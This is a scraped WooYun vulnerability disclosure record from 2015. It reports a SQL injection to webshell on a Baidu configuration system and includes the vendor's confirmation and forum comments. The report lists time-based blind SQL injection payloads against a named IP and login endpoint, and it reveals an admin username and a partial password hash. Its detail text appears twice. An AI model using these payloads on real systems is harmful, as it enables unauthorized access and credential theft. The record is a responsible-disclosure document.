{"id": 72528, "wybug_id": "wooyun-2015-0156722", "wybug_title": "百度某系统SQL注入到Getshell", "wybug_corp": "百度", "wybug_author": "玉林嘎", "wybug_date": "2015-11-29 09:19", "wybug_open_date": "2016-01-13 12:20", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-11-29：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-12-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-12-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-13：\t细节向公众公开  简要描述： rt 详细说明：  http://103.235.46.165  百度云主防配置系统\nhttp://103.235.46.165/index.php/Manage/loginpost:username=test&password=test{\"status\":0,\"info\":\"用户密码不正确\",\"data\":false}\n\nhttp://103.235.46.165/index.php/Manage/loginpost:username=test'&password=test{\"status\":0,\"info\":\"用户名不存在\",\"data\":false}\n登录点是 无论用户名密码对错都是用户密码不正确 但是' 出现用户名不存在post:username=test' or sleep(1)#&password=test  延迟10秒 里面有8个用户好像\n\nsqlmap可以跑 但是非常非常慢 几乎跑不出 跑半天一个字母没看到登录处 那就直接查同表信息 登录即可\nusername=test' or username like '%' and sleep(1)#&password=test\n延时 字段username 同理password也存在先读个用户名出来 \nusername=test' or username like 't%' and sleep(1)#&password=test\n延迟了 依次注出用户 tanguangxi\nusername=tanguangxi' and password like '3%' and sleep(5)#&password=test\n依次注出password31c724c7395d4367dfa6d4**********解出登录\n\n后台有2个地方可上传任意文件 却不返回路径 有几处连接报错\n\n猜测上传路径 无果苦死很久 想一想回到登录位置 看下注入权限咋样 毕竟拿到路径了\n\n不是root 但是不是root不代表没权限直接union select写文件试试order by出字段为9\n\n\n\n\n\n\n\n这台服务器应该还是挺重要的样子shell几分钟断一次 以为是负载均衡 又不像 未深入   漏洞证明：  http://103.235.46.165  百度云主防配置系统\nhttp://103.235.46.165/index.php/Manage/loginpost:username=test&password=test{\"status\":0,\"info\":\"用户密码不正确\",\"data\":false}\n\nhttp://103.235.46.165/index.php/Manage/loginpost:username=test'&password=test{\"status\":0,\"info\":\"用户名不存在\",\"data\":false}\n登录点是 无论用户名密码对错都是用户密码不正确 但是' 出现用户名不存在post:username=test' or sleep(1)#&password=test  延迟10秒 里面有8个用户好像\n\nsqlmap可以跑 但是非常非常慢 几乎跑不出 跑半天一个字母没看到登录处 那就直接查同表信息 登录即可\nusername=test' or username like '%' and sleep(1)#&password=test\n延时 字段username 同理password也存在先读个用户名出来 \nusername=test' or username like 't%' and sleep(1)#&password=test\n延迟了 依次注出用户 tanguangxi\nusername=tanguangxi' and password like '3%' and sleep(5)#&password=test\n依次注出password31c724c7395d4367dfa6d4**********解出登录\n\n后台有2个地方可上传任意文件 却不返回路径 有几处连接报错\n\n猜测上传路径 无果苦死很久 想一想回到登录位置 看下注入权限咋样 毕竟拿到路径了\n\n不是root 但是不是root不代表没权限直接union select写文件试试order by出字段为9\n\n\n\n\n\n\n\n这台服务器应该还是挺重要的样子shell几分钟断一次 以为是负载均衡 又不像 未深入   修复方案：  修复   版权声明：转载请注明来源 玉林嘎@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-11-29 12:19 厂商回复： 非常感谢您的报告，问题已着手处理，感谢您对百度安全的关注。如果您有任何疑问，欢迎反馈，我们会有专人跟进处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2015-11-29 09:24 |    \t\t逆流冰河 \t\t\t( 普通白帽子  |\t\t\t        Rank:370 漏洞数:86        | 逆水行舟难于恒，流水年华苦于今，冰天...)\t\t \n  第一排    \n     2015-11-29 09:38 |    \t\tanswer  \t\t\t( 普通白帽子  |\t\t\t        Rank:397 漏洞数:49        | 答案)\t\t \n  前排    \n     2015-11-29 09:48 |    \t\t镱鍚 \t\t\t( 实习白帽子  |\t\t\t        Rank:50 漏洞数:9        | 。。！)\t\t \n  前排。看姿势    \n     2015-11-29 10:01 |    \t\t奶嘴 \t\t\t( 路人 |\t\t\t        Rank:28 漏洞数:18        | 菜鸟白帽)\t\t \n  SS同上    \n     2015-11-29 10:39 |    \t\tMark0smith \t\t\t( 实习白帽子  |\t\t\t        Rank:99 漏洞数:36        )\t\t \n  6666666    \n     2015-11-29 10:47 |    \t\t举起手来 \t\t\t( 核心白帽子 |\t\t\t        Rank:1074 漏洞数:106        | 准备好，举起手来！)\t\t \n  哥留的洞，几个月了，都被你们撸了，草    \n     2015-11-29 10:55 |    \t\t牛肉包子 \t\t\t( 普通白帽子  |\t\t\t        Rank:262 漏洞数:66        | baozisec)\t\t \n  嘎嘎吃药了    \n     2015-11-29 12:06 |    \t\twaking-云狐 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 别问我为什么！)\t\t \n  前排卖套套,大号，精装    \n     2015-11-29 12:18 |    \t\t_Thorns \t\t\t( 普通白帽子  |\t\t\t        Rank:1612 漏洞数:241        | WooYun is the Bigest gay place :))\t\t \n  基佬你也吃伟哥了！！！    \n     2015-11-29 12:50 |    \t\t撸管 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:6        | QQ94170844 不再玩wooyun)\t\t \n  哥留的洞，几个月了，都被你们撸了，草    \n     2015-11-29 16:54 |    \t\tExploit DB \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 最帅的小白，刚混乌云，求大牛多多关照)\t\t \n  沃日！！百度getshell？前排求关注    \n     2015-12-19 13:17 |    \t\t_Thorns \t\t\t( 普通白帽子  |\t\t\t        Rank:1612 漏洞数:241        | WooYun is the Bigest gay place :))\t\t \n  每天最开心的就是基佬漏洞公开的那一时刻。    \n     2015-12-19 13:19 |    \t\t心云 \t\t\t( 普通白帽子  |\t\t\t        Rank:184 漏洞数:57        | Rank:200 漏洞数:55 | Rank:300 漏洞数:70 ...)\t\t \n  20到手  666    \n     2015-12-19 13:23 |    \t\t玉林嘎  \t\t\t( 核心白帽子 |\t\t\t        Rank:900 漏洞数:104        )\t\t \n  @_Thorns 最不开心的就是看你的漏洞 提醒：级别足够但是无法查看 Rank 高于自己的白帽子漏洞    \n     2015-12-31 15:54 |    \t\tManning \t\t\t( 普通白帽子  |\t\t\t        Rank:844 漏洞数:109        | https://github.com/manning23/MSpider)\t\t \n  666,这些ip段真是准啊    \n     2015-12-31 16:01 |    \t\twhynot \t\t\t( 普通白帽子  |\t\t\t        Rank:532 漏洞数:94        | 为你解冻冰河 为你放弃世界有何不可)\t\t \n  @玉林嘎 666    \n     2015-12-31 18:26 |    \t\tExploit DB \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 最帅的小白，刚混乌云，求大牛多多关照)\t\t \n  提醒：级别足够但是无法查看 Rank 高于自己的白帽子漏洞 ( 可以等待进一步公开或者支付 10 个乌云币提前查看   确定支付并查看 ) 最悲惨的事情发生了...    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}